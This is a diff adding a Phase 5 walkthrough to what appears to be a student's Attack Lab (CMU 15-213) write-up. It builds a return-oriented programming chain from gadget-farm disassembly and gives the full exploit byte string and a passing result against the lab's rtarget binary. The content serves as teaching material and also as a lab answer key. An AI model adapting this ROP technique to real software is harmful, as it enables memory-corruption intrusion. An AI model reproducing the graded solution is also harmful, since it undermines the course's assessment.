@@ -360,4 +360,148 @@
             lab     attacklab
             result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
     ```
+
 ### Phase 5
+- We use the `add_xy` function in the gadget farm to calculate the address of the cookie string, and move this value to register `%rdi`, finally we invoke `touch3` function
+
+- The ROP plan is as follows:
+
+1. `movq %rsp, %rax` (`48 89 e0`), one of the addresses is `0x401a06`
+    - We need `movq %rsp, %rdi` (`48 89 e7`) or `movq %rsp, %rsi` (`48 89 e6`)
+
+    - The gadge farm only has `movq %rsp, %rax` (`48 89 e0`)
+
+        ```
+        0000000000401a03 <addval_190>:
+        401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+        401a09:	c3                   	ret    
+        ```
+
+        ```
+        0000000000401aab <setval_350>:
+        401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
+        401ab1:	c3                   	ret    
+        ```
+1. `movq %rax, %rdi` (`48 89 c7`), one of the addresses is `0x4019a2`
+    - `movq %rax, %rdi` (`48 89 c7`) or `movq %rax, %rsi` (`48 89 c6`) are suitable
+
+    - The gadge farm only has `movq %rax, %rdi` (`48 89 c7`)
+
+        ```
+        00000000004019a0 <addval_273>:
+        4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+        4019a6:	c3                   	ret    
+        ```
+
+        ```
+        00000000004019c3 <setval_426>:
+        4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+        4019c9:	c3                   	ret    
+        ```
+
+1. `popq %rax`, one of addresses: `0x4019ab`
+
+    ```
+    00000000004019a7 <addval_219>:
+    4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+    4019ad:	c3                   	ret    
+    ```
+
+    ```
+    00000000004019ca <getval_280>:
+    4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+    4019cf:	c3                   	ret    
+    ```
+
+1. `movq %rax, %rsi` or `movl %eax, %esi` (`89 c6`)
+
+    - There is no gadgets which use `%rsi` as the destination operand in the gadget farm, so we choose the instruction which uses `esi` as the destination operand
+
+    1. `movl %ecx, %esi` (`89 ce`), one of the addresses is `0x401a13`
+        ```
+        0000000000401a11 <addval_436>:
+        401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+        401a17:	c3                   	ret    
+        ```
+
+        ```
+        0000000000401a25 <addval_187>:
+        401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
+        401a2b:	c3                   	ret    
+        ```
+
+    1. `movl %edx, %ecx` (`89 d1`), one of the addresses is `0x401a34`
+        ```
+        0000000000401a33 <getval_159>:
+        401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
+        401a38:	c3                   	ret    
+        ```
+        ```
+        0000000000401a68 <getval_311>:
+        401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
+        401a6d:	c3                   	ret    
+        ```
+
+    1. `movl %eax, %edx` (`89 c2`), one of the addresses is `0x4019dd`
+        ```
+        00000000004019db <getval_481>:
+        4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+        4019e0:	c3                   	ret    
+        ```
+
+        ```
+        0000000000401a40 <addval_487>:
+        401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
+        401a46:	c3                   	ret    
+        ```
+
+1. Invoke `add_xy` procedure
+    - Save the cookie string address in register `%rax`
+
+    - `add_xy` first instruction address is `0x4019d6`
+
+1. `movq %rax, %rdi` (`48 89 c7`), one of the addresses is `0x4019a2`
+
+1. Invoke `touch3`
+    - `touch3` first instruction address is `0x4018fa`
+
+- The stack frame of phase 5 is 
+
+    ![](./images/phase_5_stack_frame.png)
+
+- The phase 5 string is 
+
+    ```
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00 /* 40 bytes to fill the stack frame of getbuf */
+    06 1a 40 00 00 00 00 00 /* gadget 1 address */
+    a2 19 40 00 00 00 00 00 /* gadget 2 address */
+    ab 19 40 00 00 00 00 00 /* gadget 3 address */
+    48 00 00 00 00 00 00 00 /* cookie string address offset */
+    dd 19 40 00 00 00 00 00 /* gadget 4.3 address */
+    34 1a 40 00 00 00 00 00 /* gadget 4.2 address */
+    13 1a 40 00 00 00 00 00 /* gadget 4.1 address */
+    d6 19 40 00 00 00 00 00 /* add_xy first instruction address */
+    a2 19 40 00 00 00 00 00 /* gadget 6 address */
+    fa 18 40 00 00 00 00 00 /* touch3 first instruction address */
+    35 39 62 39 39 37 66 61
+    00 00 00 00 00 00 00 00 /* cookie string */
+    ```
+
+- The result is 
+
+    ```
+    LD_PRELOAD=./printf.so ./rtarget -q -i phase_5/phase_5_exploit_raw.txt 
+
+    Cookie: 0x59b997fa
+    Touch3!: You called touch3("59b997fa")
+    Valid solution for level 3 with target rtarget
+    PASS: Would have posted the following:
+            user id bovik
+            course  15213-f15
+            lab     attacklab
+            result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 
+    ```
